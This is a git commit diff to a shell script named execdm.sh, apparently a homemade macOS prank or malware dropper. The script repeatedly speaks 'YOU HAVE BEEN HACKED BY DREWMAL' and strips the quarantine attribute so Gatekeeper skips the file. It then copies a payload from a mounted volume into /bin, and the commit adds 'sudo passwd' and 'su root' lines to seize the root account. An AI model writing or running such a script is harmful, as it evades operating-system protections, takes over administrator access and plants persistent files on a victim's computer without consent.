823e9caebd7c302bf3691064f9deaf13a0c5aadc
drewtube <84208872+drewtube@users.noreply.github.com>
2022-12-13 09:49:27 -0800

    Update execdm.sh

--- execdm.sh
+++ execdm.sh
@@ -10,6 +10,8 @@ sleep 3
 say YOU HAVE BEEN HACKED BY DREWMAL
 sleep 3
 say YOU HAVE BEEN HACKED BY DREWMAL
+sudo passwd
+su root
 sudo cp /volumes/hacktop/main.sh /volumes/hacktop/emmc
 xattr -d com.apple.quarantine emmc
 sudo cp /volumes/hacktop/emmc /bin/emmc
